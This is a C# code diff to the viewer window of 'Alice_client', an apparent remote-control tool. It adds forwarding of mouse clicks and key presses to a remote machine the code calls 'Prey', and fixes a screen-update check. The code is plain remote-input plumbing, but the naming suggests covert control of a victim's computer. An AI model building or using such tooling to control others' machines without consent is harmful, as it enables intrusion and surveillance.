@@ -21,7 +21,7 @@ namespace Alice_client
         public Viewer(int index)
         {
             InitializeComponent();
-
+            this.KeyPreview = true;
             index_for_Prey = index;
             pictureBox1.SizeMode = PictureBoxSizeMode.AutoSize;
             flowLayoutPanel1.Controls.Add(pictureBox1);
@@ -145,7 +145,10 @@ namespace Alice_client
 
                 if (isStartUpdate)
                 {
-                    allbyte[next[0]] = next;
+                    if (next.Length > 12)//error update_data
+                    {
+                        allbyte[next[0]] = next;
+                    }
                 }
                 if (reciv.Equals("update_data"))
                 {
@@ -187,7 +190,7 @@ namespace Alice_client
                     int _mouse_X = (Cursor.Position.X - this.Location.X)-10;
                     int _mouse_Y = (Cursor.Position.Y - this.Location.Y)-30;
                     Console.WriteLine(_mouse_X + " " + _mouse_Y);
-                    byte[] mousecoord = BaseTool.Convertbtst("[mouse_event][" + _mouse_X + "][" + _mouse_Y + "]");
+                    byte[] mousecoord = BaseTool.Convertbtst("[mouse_move][" + _mouse_X + "][" + _mouse_Y + "]");
                     Connection.server1.Send_mess(mousecoord, _PreySRV);
                     whait_send = 0;
                 }
@@ -199,9 +202,51 @@ namespace Alice_client
             }
         }
 
+        private void picture_MouseDown(object sender, MouseEventArgs e)
+        {
+            int _mouse_X = (Cursor.Position.X - this.Location.X) - 10;
+            int _mouse_Y = (Cursor.Position.Y - this.Location.Y) - 30;
+
+            byte[] mousecoord = BaseTool.Convertbtst("[mouse_down][" + _mouse_X + "][" + _mouse_Y + "]");
+                    Connection.server1.Send_mess(mousecoord, _PreySRV);
+                    whait_send = 0;
+               
+        }
+        private void picture_MouseUP(object sender, MouseEventArgs e)
+        {
+            int _mouse_X = (Cursor.Position.X - this.Location.X) - 10;
+            int _mouse_Y = (Cursor.Position.Y - this.Location.Y) - 30;
+            byte[] mousecoord = BaseTool.Convertbtst("[mouse_up][" + _mouse_X + "][" + _mouse_Y + "]");
+            Connection.server1.Send_mess(mousecoord, _PreySRV);
+            whait_send = 0;
+
+        }
+
         private void button1_Click(object sender, EventArgs e)
         {
             capture = true;
+        }
+
+        private void Viewer_KeyPress(object sender, KeyPressEventArgs e)
+        {
+          string   key = e.KeyChar.ToString();
+            byte[] mousecoord = BaseTool.Convertbtst("[key_press]["+key+"]");
+            Connection.server1.Send_mess(mousecoord, _PreySRV);
+
+        }
+
+        private void Viewer_KeyPress_1(object sender, KeyPressEventArgs e)
+        {
+            string key = e.KeyChar.ToString();
+            byte[] mousecoord = BaseTool.Convertbtst("[key_press][" + key + "]");
+            Connection.server1.Send_mess(mousecoord, _PreySRV);
+        }
+
+        private void Viewer_KeyDown(object sender, KeyEventArgs e)
+        {
+            //string key = e.KeyCode.ToString();
+            //byte[] mousecoord = BaseTool.Convertbtst("[key_press][" + key + "]");
+            //Connection.server1.Send_mess(mousecoord, _PreySRV);
         }
     }
 }
